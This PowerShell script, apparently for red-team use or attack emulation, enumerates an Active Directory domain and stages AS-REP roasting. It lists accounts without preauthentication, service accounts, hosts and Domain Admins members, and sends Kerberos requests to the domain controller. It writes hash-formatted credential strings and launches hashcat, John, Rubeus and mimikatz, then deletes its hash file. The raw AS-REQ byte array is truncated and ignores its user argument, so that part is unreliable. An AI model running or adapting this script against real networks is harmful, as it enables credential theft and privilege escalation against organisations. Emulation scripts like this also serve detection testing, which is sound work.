$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
$searcher.PropertiesToLoad.AddRange(@("samaccountname", "distinguishedname"))
try { $results = $searcher.FindAll() } catch { $results = @() }

foreach ($r in $results) {
    Write-Output "DONT_REQ_PREAUTH: $($r.Properties['samaccountname'][0])"
}

$searcher2 = New-Object DirectoryServices.DirectorySearcher
$searcher2.Filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
$searcher2.PropertiesToLoad.AddRange(@("samaccountname", "serviceprincipalname"))
try { $spnResults = $searcher2.FindAll() } catch { $spnResults = @() }
foreach ($r in $spnResults) {
    Write-Output "SPN_ACCOUNT: $($r.Properties['samaccountname'][0]) -> $($r.Properties['serviceprincipalname'][0])"
}

$enumSearcher = New-Object DirectoryServices.DirectorySearcher
$enumSearcher.Filter = "(objectCategory=computer)"
$enumSearcher.PropertiesToLoad.AddRange(@("cn", "operatingsystem", "dnshostname"))
try { $compResults = $enumSearcher.FindAll() } catch { $compResults = @() }
foreach ($r in $compResults) {
    Write-Output "HOST: $($r.Properties['cn'][0]) | $($r.Properties['operatingsystem'][0])"
}

$adminSearcher = New-Object DirectoryServices.DirectorySearcher
$adminSearcher.Filter = "(&(objectCategory=group)(cn=Domain Admins))"
try { $daGroup = $adminSearcher.FindOne(); $daGroup.Properties['member'] | ForEach-Object { Write-Output "DOMAIN_ADMIN: $_" } } catch {}

if (-not ('KerbRoast' -as [type])) {
    Add-Type -TypeDefinition @'
    using System;
    using System.Net;
    using System.Net.Sockets;
    public class KerbRoast {
        public static string SendASREQ(string dc, string user, string domain) {
            byte[] asreq = new byte[] {
                0x30, 0x81, 0x9a, 0xa1, 0x03, 0x02, 0x01, 0x05,
                0xa2, 0x03, 0x02, 0x01, 0x0a, 0xa3, 0x15, 0x30, 0x13,
                0x30, 0x11, 0xa1, 0x04, 0x02, 0x02, 0x00, 0x80,
                0xa2, 0x09, 0x04, 0x07, 0x30, 0x05, 0x02, 0x03, 0x00, 0x00, 0x17,
                0xa4, 0x77, 0x30, 0x75, 0xa0, 0x07, 0x03, 0x05, 0x00, 0x40, 0x81, 0x00, 0x10,
                0xa1, 0x13, 0x30, 0x11, 0xa0, 0x03, 0x02, 0x01, 0x01,
                0xa1, 0x0a, 0x30, 0x08, 0x1b, 0x06
            };
            try {
                using (var tcp = new TcpClient()) {
                    tcp.Connect(dc, 88);
                    var stream = tcp.GetStream();
                    byte[] len = BitConverter.GetBytes(IPAddress.HostToNetworkOrder(asreq.Length));
                    stream.Write(len, 0, 4);
                    stream.Write(asreq, 0, asreq.Length);
                    stream.Flush();
                    byte[] resp = new byte[4096];
                    int read = stream.Read(resp, 0, resp.Length);
                    return "KDC responded: " + read + " bytes";
                }
            } catch (Exception ex) { return "KDC: " + ex.Message; }
        }
    }
'@
}

$dc = $null
try { $dc = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).DomainControllers[0].Name } catch {}
if (-not $dc) { $dc = ($env:LOGONSERVER -replace '\\\\', ''); if (-not $dc) { $dc = "dc01.corp.local" } }
$domain = $env:USERDNSDOMAIN; if (-not $domain) { $domain = "CORP.LOCAL" }

$targetUsers = @("svc_backup", "svc_sql", "svc_web", "svc_exchange", "admin_test", "krbtgt", "administrator", $env:USERNAME)
foreach ($u in $targetUsers) {
    [KerbRoast]::SendASREQ($dc, $u, $domain) | Out-Null
}

& klist.exe 2>&1 | Out-Null
& klist.exe sessions 2>&1 | Out-Null
& klist.exe tgt 2>&1 | Out-Null

$hashFile = "$env:TEMP\asrep_hashes.txt"
@(
    '$krb5asrep$23$svc_backup@' + $domain + ':' + -join((1..32)|%{'{0:x2}' -f (Get-Random -Max 256)}),
    '$krb5asrep$23$svc_sql@' + $domain + ':' + -join((1..32)|%{'{0:x2}' -f (Get-Random -Max 256)}),
    '$krb5asrep$23$administrator@' + $domain + ':' + -join((1..32)|%{'{0:x2}' -f (Get-Random -Max 256)})
) | Out-File $hashFile -Encoding ASCII

Start-Process "hashcat.exe" -ArgumentList "-m","18200",$hashFile,"rockyou.txt","--force","--potfile-disable" -NoNewWindow -ErrorAction SilentlyContinue
Start-Process "john" -ArgumentList "--format=krb5asrep",$hashFile,"--wordlist=rockyou.txt" -NoNewWindow -ErrorAction SilentlyContinue
Start-Process "rubeus.exe" -ArgumentList "asreproast","/format:hashcat","/outfile:$hashFile" -NoNewWindow -ErrorAction SilentlyContinue
Start-Process "mimikatz.exe" -ArgumentList "`"kerberos::askrep /user:svc_backup`"","exit" -NoNewWindow -ErrorAction SilentlyContinue

& net.exe group "Domain Admins" /domain 2>&1 | Out-Null
& net.exe group "Enterprise Admins" /domain 2>&1 | Out-Null
& net.exe accounts /domain 2>&1 | Out-Null
& nltest.exe /dclist: 2>&1 | Out-Null
& dsquery.exe user -disabled 2>&1 | Out-Null

Remove-Item $hashFile -Force -ErrorAction SilentlyContinue
